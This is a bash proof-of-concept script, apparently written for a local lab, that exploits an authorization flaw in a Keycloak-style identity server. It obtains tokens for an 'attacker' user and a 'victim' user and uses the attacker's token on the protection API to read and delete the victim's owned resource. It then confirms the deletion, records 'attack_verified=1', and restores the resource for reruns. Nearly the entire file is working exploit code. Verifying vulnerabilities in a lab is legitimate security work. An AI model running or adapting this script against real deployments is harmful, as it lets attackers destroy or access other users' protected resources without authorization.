#!/usr/bin/env bash
set -euo pipefail

BASE_URL="http://127.0.0.1:8080"
REALM="anypoc"
CLIENT_ID="resource-server-test"
CLIENT_SECRET="secret"
ADMIN_USER="admin"
ADMIN_PASS="adminpass"
ATTACKER_USER="marta"
VICTIM_USER="kolo"
TARGET_NAME="ANYPOC Kolo Resource 2"
TARGET_MARKER="victim-target-2"

ROOT_DIR="/home/playground/output/attempt_1"
EVIDENCE_DIR="$ROOT_DIR/evidence"
mkdir -p "$EVIDENCE_DIR"

admin_token() {
  curl -sS -X POST "$BASE_URL/realms/master/protocol/openid-connect/token" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode 'grant_type=password' \
    --data-urlencode 'client_id=admin-cli' \
    --data-urlencode "username=$ADMIN_USER" \
    --data-urlencode "password=$ADMIN_PASS" | jq -r '.access_token'
}

user_token() {
  local username="$1"
  curl -sS -X POST "$BASE_URL/realms/$REALM/protocol/openid-connect/token" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode 'grant_type=password' \
    --data-urlencode "client_id=$CLIENT_ID" \
    --data-urlencode "client_secret=$CLIENT_SECRET" \
    --data-urlencode "username=$username" \
    --data-urlencode 'password=password' | jq -r '.access_token'
}

client_internal_id() {
  local at="$1"
  curl -sS -H "Authorization: Bearer $at" \
    "$BASE_URL/admin/realms/$REALM/clients?clientId=$CLIENT_ID" | jq -r '.[0].id'
}

resource_list() {
  local at="$1"
  local client_id="$2"
  curl -sS -H "Authorization: Bearer $at" \
    "$BASE_URL/admin/realms/$REALM/clients/$client_id/authz/resource-server/resource"
}

find_target_id() {
  jq -r --arg name "$TARGET_NAME" --arg marker "$TARGET_MARKER" \
    '.[] | select(.name == $name and .attributes.anypoc_marker[0] == $marker) | ._id'
}

create_target() {
  local at="$1"
  local client_id="$2"
  local payload
  payload="$(jq -n \
    --arg name "$TARGET_NAME" \
    --arg owner "$VICTIM_USER" \
    --arg marker "$TARGET_MARKER" \
    '{
      name: $name,
      owner: $owner,
      ownerManagedAccess: true,
      attributes: {anypoc_marker: [$marker]},
      scopes: [
        {name: "Scope A"},
        {name: "Scope B"},
        {name: "Scope C"}
      ]
    }')"

  curl -sS -X POST \
    -H "Authorization: Bearer $at" \
    -H 'Content-Type: application/json' \
    --data "$payload" \
    "$BASE_URL/admin/realms/$REALM/clients/$client_id/authz/resource-server/resource"
}

probe_resource() {
  local token="$1"
  local resource_id="$2"
  local out_file="$3"
  curl -sS -o "$out_file" -w '%{http_code}' \
    -H "Authorization: Bearer $token" \
    "$BASE_URL/realms/$REALM/authz/protection/resource_set/$resource_id"
}

delete_resource() {
  local token="$1"
  local resource_id="$2"
  local out_file="$3"
  curl -sS -o "$out_file" -w '%{http_code}' -X DELETE \
    -H "Authorization: Bearer $token" \
    "$BASE_URL/realms/$REALM/authz/protection/resource_set/$resource_id"
}

admin_at="$(admin_token)"
client_id="$(client_internal_id "$admin_at")"

before_resources="$(resource_list "$admin_at" "$client_id")"
printf '%s\n' "$before_resources" > "$EVIDENCE_DIR/before_admin_resources.json"

victim_id="$(printf '%s\n' "$before_resources" | find_target_id | head -n1)"
if [[ -z "$victim_id" || "$victim_id" == "null" ]]; then
  created="$(create_target "$admin_at" "$client_id")"
  printf '%s\n' "$created" > "$EVIDENCE_DIR/admin_created_victim.json"
  victim_id="$(printf '%s\n' "$created" | jq -r '._id')"
fi

attacker_at="$(user_token "$ATTACKER_USER")"
victim_at="$(user_token "$VICTIM_USER")"

marta_get_http="$(probe_resource "$attacker_at" "$victim_id" "$EVIDENCE_DIR/marta_get_victim.json")"
printf '%s\n' "$marta_get_http" > "$EVIDENCE_DIR/marta_get_status.txt"
kolo_get_http="$(probe_resource "$victim_at" "$victim_id" "$EVIDENCE_DIR/kolo_get_victim.json")"
printf '%s\n' "$kolo_get_http" > "$EVIDENCE_DIR/kolo_get_status.txt"
marta_delete_http="$(delete_resource "$attacker_at" "$victim_id" "$EVIDENCE_DIR/marta_delete_victim.body")"
printf '%s\n' "$marta_delete_http" > "$EVIDENCE_DIR/marta_delete_status.txt"

after_delete_resources="$(resource_list "$admin_at" "$client_id")"
printf '%s\n' "$after_delete_resources" > "$EVIDENCE_DIR/after_delete_admin_resources.json"

if printf '%s\n' "$after_delete_resources" | jq -e --arg id "$victim_id" '.[] | select(._id == $id)' >/dev/null; then
  echo "victim resource still present after attacker delete" >&2
  exit 1
fi

# Restore the victim resource so the lab remains reusable for reruns.
restored="$(create_target "$admin_at" "$client_id")"
printf '%s\n' "$restored" > "$EVIDENCE_DIR/admin_restored_victim.json"

cat > "$EVIDENCE_DIR/summary.txt" <<EOF
victim_id=$victim_id
marta_get_http=$marta_get_http
kolo_get_http=$kolo_get_http
marta_delete_http=$marta_delete_http
attack_verified=1
EOF

cat "$EVIDENCE_DIR/summary.txt"
